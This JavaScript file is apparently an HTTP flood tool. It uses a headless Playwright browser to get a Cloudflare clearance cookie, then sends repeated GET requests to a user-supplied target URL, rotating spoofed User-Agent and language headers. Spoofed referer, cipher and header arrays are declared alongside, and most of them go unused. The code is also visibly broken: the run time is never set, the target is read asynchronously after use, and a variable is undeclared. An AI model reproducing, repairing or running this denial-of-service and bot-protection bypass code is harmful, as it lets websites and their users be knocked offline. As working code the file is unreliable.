const { chromium } = require('playwright');
const axios = require('axios');
const url = require('url');
const randomstring = require('randomstring');
const tough = require('tough-cookie');
const { Cookie } = tough;
const http2 = require('http2');
const { v4: uuidv4 } = require('uuid');
const Cloudflare = require('cloudflare');
const readline = require('readline');

let cookieJAR = 'asffghjklzxcvbnmqwertyuiop';


async function getCookie(url) {
    const browser = await chromium.launch();
    const context = await browser.newContext();
    const page = await context.newPage();
    await page.goto(url);
    await page.waitForTimeout(3000);
    const cookies = await context.cookies();
    for (const cookie of cookies) {
        if (cookie.name === 'cf_clearance') {
            useragent = await page.evaluate(() => navigator.userAgent);
            cookieJAR = cookie;
            await browser.close();
            return true;
        }
    }
    await browser.close();
    return false;
}

const args = {
    target: '',
    time: 0,
    Rate: 0,
    threads: 0,
    proxyFile: ''
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

rl.question('Enter the target URL: ', (answer) => {
    args.target = answer;
    rl.question('Enter the number of threads: ', (answer) => {
        args.threads = parseInt(answer);
        rl.close();
    });
});

const sig = [   
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
];

const sigalgs1 = sig.join(':');

const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256", 
    "ECDHE-ECDSA-CHACHA20-POLY1305", 
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256"
];

const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
];

const lang_header = [
    'ko-KR',
    'en-US',
    'zh-CN',
    'zh-TW',
    'ja-JP',
    'en-GB'
];

const encoding_header = [
    'gzip, deflate, br',
    'deflate',
    'gzip, deflate, lzma, sdch',
    'deflate'
];

const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
];

const control_header = ["no-cache", "max-age=0", "no-store", "no-transform", "only-if-cached", "must-revalidate", "public", "private", "proxy-revalidate", "s-maxage=86400"];

const refers = [
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/"
];

async function makeRequest(url, threads, bypassed) {
    if (bypassed) {
        console.log('Bypass Cloudflare successful.');

        let endTime = Date.now() + args.time * 1000; // End time as requested by the user

        while (Date.now() < endTime) {
            for (let i = 0; i < threads; i++) {
                const response = await axios.get(url, {
                    headers: {
                        'User-Agent': uap[Math.floor(Math.random() * uap.length)],
                        'Accept-Language': lang_header[Math.floor(Math.random() * lang_header.length)],
                    }
                });

                console.log(`Request ${i + 1} completed with status code: ${response.status}`);
            }
        }
        console.log(`Time's up. Bot stopped after ${args.time} seconds.`);
    } else {
        console.log('No Cloudflare security detected. Making direct request.');
        for (let i = 0; i < threads; i++) {
            const response = await axios.get(url);
            console.log(`Request ${i + 1} completed with status code: ${response.status}`);
        }
    }
}

(async () => {
    const url = args.target;
    const bypassed = await getCookie(url);

    await makeRequest(url, args.threads, bypassed);
})();
  
